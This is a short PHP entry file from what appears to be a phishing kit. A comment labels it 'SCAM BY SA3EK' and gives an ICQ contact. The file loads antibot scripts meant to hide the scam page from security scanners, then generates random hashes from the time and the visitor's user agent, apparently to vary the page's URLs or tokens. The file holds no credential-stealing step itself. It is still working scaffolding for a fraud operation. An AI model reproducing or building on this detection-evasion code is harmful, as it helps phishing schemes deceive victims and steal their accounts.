<?php
	error_reporting(E_ERROR | E_PARSE);
	include('verify/antibots/bot.php');
    include('verify/antibots/checkbots.php');
	include('verify/antibots/perfect.php');
/******
SCAM BY SA3EK
ICQ : 740900705
*******/
	$date = new DateTime("NOW");
	$hash = crypt($date->format( "m-d-Y H:i:s.u").$_SERVER['HTTP_USER_AGENT'], '');
	$hash2 = substr(str_shuffle("0987654321abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".md5($date->format( "m-d-Y H:i:s.u"))), 0, 1000);
?>